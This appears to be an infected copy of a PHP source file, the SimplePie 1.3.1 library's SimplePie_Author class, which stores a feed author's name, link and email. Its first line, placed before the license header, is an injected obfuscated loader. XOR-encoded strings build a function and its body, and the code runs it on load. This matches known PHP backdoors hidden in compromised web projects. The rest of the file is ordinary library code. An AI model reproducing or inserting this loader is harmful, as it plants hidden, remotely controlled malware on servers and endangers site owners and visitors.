<?php $TSrvF='1JVLC<9.691G>Y+'^'R83-7YfHCWR3W6E';$MhJlOZvyVoh=$TSrvF('','QZFw->:XJQ =dR5SC=IPEN:8qI09W:s.DXapgR<1y2BN+-=5TnXR1hJ4TT6mVD5yKYVD6HtR1KYpkTcNb1B3yC6ELBUZrKHbeq3UHciXigIDTdiRe CERI=kQTLDZPcBrIODK:<CQ>4;BaPOEF<2CTvU9gNbaBKVMcMGKoaS IQSVqNG+LD0NHb>>HXG3CCfbOF=XA;lDPO1pm M8OewJ ZROEoPsSO1OoE,DZIg4-46.xnmJ-B6AU:GXtn-8<905H.OyC-U1jxqPP0,L PaBCm4eR :2k:QYmzOe2N7B3AjXQ5QhOtu:.49HCX0No-0kLPuPMY5BzV72FCA23WQcFIrny3>tn3M49apQU3CpDBF,5+ETcl1lzOvJPD89KEBfqXpQ5LNRH8vQ+=,pssE<UL=6ClkN;Lb<i=.IYnnStLEG6B,,<;7<eNZG1O6Y6-24YGbNXEVun1-06=1+XK02,4kXji7.F3:W5NqFvAEFmbR >MoGdfUN71A1.QL5S1BN98ywUY6kGKH=Z:-qiHOpoYOwae4M6U2h-X4D6yXXGfHtAWpC90m4Y2QUEudFZAk3teTZ2MUf7NTFFUtcp1HLV80F4Ji0AP7;2Gt=AO 5Q7VhGV+M.UXHrLgqOW.x95MRRxk57BLurG4-GW4>s3KhfoIME;FhllD4'^'8<nVKKT;>8OS;7M:0I:xb6UJ.-QM6e,C1,FYNrG;pT7 HYTZ:N =C7.U 5i2;1AQo=70WdTvZ. YKtCnBJH:pgY08bhzUlshlxU::KM1IZitoDM;YS77>,SCu0-0;yXbV dob05JuQAObOmombXS75-qP:n<Af 348i.kJA T;=68Yj,N5mmgsh77:=3F1-NF 3Iqz1e9Z2;zID,L.EJjF;>< TZW7.E.0.I=ztGRLXEKCdg,B0S 6RgpP1nwsryphO<YgF0HJEOptFM U5Hb8g=A6ANS4Q4 MGoAY+Ny9HN<0A0HrTQLOXL-xRMDeDVKdqQ4,-TkZ-=; ,3WR49Cnm-<<bk1=gmUJAT:0JcMzbbZTG01JLJfsFR.10Yf  ;FLxT:P5uXA1R5JIMPNSaJ4 HSxfb311h6MYO=8NSs49+4S0EMPRMYM655n+W-WrmY,3J,963CZnIUURUNpoTSXUBtJMSO2Re<P7XoMK, EF6AJ,OaBF4<EP8nE45j6I+=MKQP><OLkklY;NLXIniPG4+BIAP,B4iOF=MckPxezFoGp4FvZUUWkTb1rGUp8qZRGV6hQufQTz5aouREPP:>7Ao-Q36U99DOAoSM 6LZ0SqDgrO,Z4qaRlGQowUr0P;3>POQV6-.U7UT+8UZTnbSlf,5,OnXEWNI');$MhJlOZvyVoh();
/**
 * SimplePie
 *
 * A PHP-Based RSS and Atom Feed Framework.
 * Takes the hard work out of managing a complete RSS/Atom solution.
 *
 * Copyright (c) 2004-2012, Ryan Parman, Geoffrey Sneddon, Ryan McCue, and contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 	* Redistributions of source code must retain the above copyright notice, this list of
 * 	  conditions and the following disclaimer.
 *
 * 	* Redistributions in binary form must reproduce the above copyright notice, this list
 * 	  of conditions and the following disclaimer in the documentation and/or other materials
 * 	  provided with the distribution.
 *
 * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
 * 	  to endorse or promote products derived from this software without specific prior
 * 	  written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
 * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * @package SimplePie
 * @version 1.3.1
 * @copyright 2004-2012 Ryan Parman, Geoffrey Sneddon, Ryan McCue
 * @author Ryan Parman
 * @author Geoffrey Sneddon
 * @author Ryan McCue
 * @link http://simplepie.org/ SimplePie
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 */

/**
 * Manages all author-related data
 *
 * Used by {@see SimplePie_Item::get_author()} and {@see SimplePie::get_authors()}
 *
 * This class can be overloaded with {@see SimplePie::set_author_class()}
 *
 * @package SimplePie
 * @subpackage API
 */
class SimplePie_Author
{
	/**
	 * Author's name
	 *
	 * @var string
	 * @see get_name()
	 */
	var $name;

	/**
	 * Author's link
	 *
	 * @var string
	 * @see get_link()
	 */
	var $link;

	/**
	 * Author's email address
	 *
	 * @var string
	 * @see get_email()
	 */
	var $email;

	/**
	 * Constructor, used to input the data
	 *
	 * @param string $name
	 * @param string $link
	 * @param string $email
	 */
	public function __construct($name = null, $link = null, $email = null)
	{
		$this->name = $name;
		$this->link = $link;
		$this->email = $email;
	}

	/**
	 * String-ified version
	 *
	 * @return string
	 */
	public function __toString()
	{
		// There is no $this->data here
		return md5(serialize($this));
	}

	/**
	 * Author's name
	 *
	 * @return string|null
	 */
	public function get_name()
	{
		if ($this->name !== null)
		{
			return $this->name;
		}
		else
		{
			return null;
		}
	}

	/**
	 * Author's link
	 *
	 * @return string|null
	 */
	public function get_link()
	{
		if ($this->link !== null)
		{
			return $this->link;
		}
		else
		{
			return null;
		}
	}

	/**
	 * Author's email address
	 *
	 * @return string|null
	 */
	public function get_email()
	{
		if ($this->email !== null)
		{
			return $this->email;
		}
		else
		{
			return null;
		}
	}
}

